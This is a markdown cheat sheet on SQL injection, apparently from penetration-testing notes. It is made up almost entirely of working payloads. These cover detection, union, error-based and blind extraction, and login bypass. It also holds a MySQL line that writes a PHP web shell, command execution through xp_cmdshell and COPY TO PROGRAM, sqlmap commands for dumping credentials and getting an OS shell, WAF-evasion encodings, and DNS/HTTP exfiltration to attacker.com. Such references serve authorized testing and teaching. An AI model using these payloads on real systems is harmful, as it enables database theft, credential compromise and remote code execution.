# SQL Injection

## Table of Contents

- [Detection](#detection)
  - [Basic Tests](#basic-tests)
  - [Error-Based Detection](#error-based-detection)
- [Union-Based Injection](#union-based-injection)
  - [Column Enumeration](#column-enumeration)
  - [Data Extraction](#data-extraction)
- [Error-Based Injection](#error-based-injection)
- [Blind SQL Injection](#blind-sql-injection)
  - [Boolean-Based](#boolean-based)
  - [Time-Based](#time-based)
- [Database Specific](#database-specific)
  - [MySQL](#mysql)
  - [PostgreSQL](#postgresql)
  - [MSSQL](#mssql)
  - [Oracle](#oracle)
  - [SQLite](#sqlite)
- [SQLMap](#sqlmap)
  - [Basic Usage](#basic-usage)
  - [POST Requests](#post-requests)
  - [Cookies and Headers](#cookies-and-headers)
  - [Database Enumeration](#database-enumeration)
  - [File Operations](#file-operations)
  - [OS Shell](#os-shell)
  - [Tamper Scripts](#tamper-scripts)
- [Authentication Bypass](#authentication-bypass)
- [WAF Bypass](#waf-bypass)
- [Second-Order SQLi](#second-order-sqli)
- [Out-of-Band (OOB)](#out-of-band-oob)

---

## Detection

### Basic Tests

> Single quote test

```sql
'
''
`
``
```

> Comment tests

```sql
'--
'#
'/*
' OR 1=1--
' OR '1'='1
" OR 1=1--
" OR "1"="1
```

> Arithmetic tests

```sql
1+1
1-1
1*1
1/1
```

### Error-Based Detection

> Force SQL errors to confirm injection

```sql
' AND 1=CONVERT(int, (SELECT @@version))--
' AND extractvalue(1, concat(0x7e, version()))--
' AND updatexml(1, concat(0x7e, version()), 1)--
```

---

## Union-Based Injection

### Column Enumeration

> Find number of columns using ORDER BY

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
' ORDER BY N-- (until error)
```

> Find number of columns using UNION SELECT

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

> Find string columns

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Data Extraction

> Extract database version

```sql
' UNION SELECT @@version,NULL,NULL--          # MySQL/MSSQL
' UNION SELECT version(),NULL,NULL--          # PostgreSQL
' UNION SELECT banner,NULL,NULL FROM v$version-- # Oracle
```

> Extract current database

```sql
' UNION SELECT database(),NULL,NULL--         # MySQL
' UNION SELECT current_database(),NULL,NULL-- # PostgreSQL
' UNION SELECT db_name(),NULL,NULL--          # MSSQL
```

> Extract table names

```sql
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
```

> Extract column names

```sql
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

> Extract data

```sql
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--
```

---

## Error-Based Injection

### MySQL

> Extract data via error messages

```sql
' AND extractvalue(1, concat(0x7e, (SELECT database())))--
' AND updatexml(1, concat(0x7e, (SELECT database())), 1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### MSSQL

> Extract data via CONVERT error

```sql
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CONVERT(int, (SELECT @@version))--
```

### PostgreSQL

> Extract data via CAST error

```sql
' AND 1=CAST((SELECT version()) AS int)--
```

---

## Blind SQL Injection

### Boolean-Based

> Test for true/false conditions

```sql
' AND 1=1--  (true - normal response)
' AND 1=2--  (false - different response)
```

> Extract data character by character

```sql
' AND SUBSTRING((SELECT database()),1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='b'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>97--
```

> Binary search for efficiency

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>109--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))=100--
```

### Time-Based

> MySQL time delay

```sql
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
```

> PostgreSQL time delay

```sql
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

> MSSQL time delay

```sql
'; WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--
```

> Oracle time delay

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

---

## Database Specific

### MySQL Queries

> System information

```sql
SELECT @@version;
SELECT user();
SELECT database();
SELECT @@datadir;
```

> List all databases

```sql
SELECT schema_name FROM information_schema.schemata;
```

> List tables

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
```

> List columns

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

> Read files

```sql
SELECT LOAD_FILE('/etc/passwd');
```

> Write files

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

### PostgreSQL Queries

> System information

```sql
SELECT version();
SELECT current_user;
SELECT current_database();
```

> List databases

```sql
SELECT datname FROM pg_database;
```

> List tables

```sql
SELECT tablename FROM pg_tables WHERE schemaname='public';
```

> List columns

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

> Read files

```sql
SELECT pg_read_file('/etc/passwd');
```

> Command execution

```sql
COPY (SELECT '') TO PROGRAM 'id';
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

### MSSQL Queries

> System information

```sql
SELECT @@version;
SELECT user_name();
SELECT db_name();
SELECT @@servername;
```

> List databases

```sql
SELECT name FROM master..sysdatabases;
SELECT name FROM sys.databases;
```

> List tables

```sql
SELECT name FROM sysobjects WHERE xtype='U';
SELECT table_name FROM information_schema.tables;
```

> List columns

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

> xp_cmdshell (command execution)

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

> Read files

```sql
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;
```

### Oracle

> System information

```sql
SELECT * FROM v$version;
SELECT user FROM dual;
SELECT ora_database_name FROM dual;
```

> List tables

```sql
SELECT table_name FROM all_tables;
SELECT table_name FROM user_tables;
```

> List columns

```sql
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
```

### SQLite

> System information

```sql
SELECT sqlite_version();
```

> List tables

```sql
SELECT name FROM sqlite_master WHERE type='table';
```

> List columns

```sql
PRAGMA table_info(users);
```

---

## SQLMap

### Basic Usage

> Test URL parameter

```shell
sqlmap -u "http://$rhost/page.php?id=1"
```

> Automatic detection

```shell
sqlmap -u "http://$rhost/page.php?id=1" --batch
```

> Specify database type

```shell
sqlmap -u "http://$rhost/page.php?id=1" --dbms=mysql
```

> Increase verbosity

```shell
sqlmap -u "http://$rhost/page.php?id=1" -v 3
```

### POST Requests

> POST data injection

```shell
sqlmap -u "http://$rhost/login.php" --data="username=admin&password=pass"
```

> Specify parameter to test

```shell
sqlmap -u "http://$rhost/login.php" --data="username=admin&password=pass" -p username
```

### Cookies and Headers

> With cookies

```shell
sqlmap -u "http://$rhost/page.php?id=1" --cookie="PHPSESSID=abc123"
```

> With custom headers

```shell
sqlmap -u "http://$rhost/page.php?id=1" -H "X-Forwarded-For: 127.0.0.1"
```

> From Burp request file

```shell
sqlmap -r request.txt
```

### Database Enumeration

> Get current database

```shell
sqlmap -u "http://$rhost/page.php?id=1" --current-db
```

> List all databases

```shell
sqlmap -u "http://$rhost/page.php?id=1" --dbs
```

> List tables in database

```shell
sqlmap -u "http://$rhost/page.php?id=1" -D database_name --tables
```

> List columns in table

```shell
sqlmap -u "http://$rhost/page.php?id=1" -D database_name -T users --columns
```

> Dump data

```shell
sqlmap -u "http://$rhost/page.php?id=1" -D database_name -T users --dump
```

> Dump specific columns

```shell
sqlmap -u "http://$rhost/page.php?id=1" -D database_name -T users -C username,password --dump
```

> Dump all

```shell
sqlmap -u "http://$rhost/page.php?id=1" --dump-all
```

### File Operations

> Read file

```shell
sqlmap -u "http://$rhost/page.php?id=1" --file-read="/etc/passwd"
```

> Write file

```shell
sqlmap -u "http://$rhost/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### OS Shell

> Get OS shell

```shell
sqlmap -u "http://$rhost/page.php?id=1" --os-shell
```

> Get SQL shell

```shell
sqlmap -u "http://$rhost/page.php?id=1" --sql-shell
```

> Execute OS command

```shell
sqlmap -u "http://$rhost/page.php?id=1" --os-cmd="whoami"
```

### Tamper Scripts

> List tamper scripts

```shell
sqlmap --list-tampers
```

> Use tamper scripts (WAF bypass)

```shell
sqlmap -u "http://$rhost/page.php?id=1" --tamper=space2comment
sqlmap -u "http://$rhost/page.php?id=1" --tamper=between,randomcase
sqlmap -u "http://$rhost/page.php?id=1" --tamper=charencode
```

> Common tamper combinations

```shell
# MySQL
sqlmap -u "http://$rhost/page.php?id=1" --tamper=space2comment,between,randomcase

# MSSQL
sqlmap -u "http://$rhost/page.php?id=1" --tamper=space2mssqlblank,between

# General WAF bypass
sqlmap -u "http://$rhost/page.php?id=1" --tamper=apostrophemask,apostrophenullencode,base64encode
```

---

## Authentication Bypass

> Common login bypass payloads

```sql
admin'--
admin'#
admin'/*
' OR 1=1--
' OR 1=1#
' OR '1'='1
' OR '1'='1'--
" OR 1=1--
" OR "1"="1
admin' OR '1'='1
admin" OR "1"="1
') OR ('1'='1
') OR '1'='1'--
```

> MD5 hash comparison bypass

```sql
' UNION SELECT 1,'admin','81dc9bdb52d04dc20036dbd8313ed055'-- (password: 1234)
```

---

## WAF Bypass

### Space Bypass

```sql
/**/
+
%20
%09
%0a
%0b
%0c
%0d
```

> Examples

```sql
UNION/**/SELECT/**/1,2,3
UNION+SELECT+1,2,3
```

### Comment Bypass

```sql
/*!UNION*/ /*!SELECT*/ 1,2,3
```

### Case Variation

```sql
UnIoN SeLeCt 1,2,3
uNiOn sElEcT 1,2,3
```

### Encoding

```text
# URL encoding
%55%4e%49%4f%4e%20%53%45%4c%45%43%54

# Double URL encoding
%2555%254e%2549%254f%254e
```

### Null Byte

```sql
%00' UNION SELECT 1,2,3--
```

---

## Second-Order SQLi

> Inject payload that gets stored and executed later

```sql
# During registration (stored)
Username: admin'--

# During password reset (executed)
UPDATE users SET password='newpass' WHERE username='admin'--'
```

---

## Out-of-Band (OOB)

### DNS Exfiltration

> MySQL

```sql
SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'));
```

> MSSQL

```sql
EXEC master..xp_dirtree '\\attacker.com\a';
EXEC master..xp_subdirs '\\attacker.com\a';
```

> Oracle

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual;
SELECT HTTPURITYPE('http://attacker.com/'||user).getclob() FROM dual;
```

---

## See Also

- **[Web Application Analysis](7.0.Web-Application-Analysis.md)** - Web recon and enumeration
- **[Command Injection](7.4.Command-Injection.md)** - OS command injection
- **[MSSQL](../1.Scanning/IT-Ports/1433-mssql.md)** - MSSQL specific attacks
- **[MySQL](../1.Scanning/IT-Ports/3306-mysql.md)** - MySQL specific attacks
- **[PostgreSQL](../1.Scanning/IT-Ports/5432-5433-postgresql.md)** - PostgreSQL specific attacks
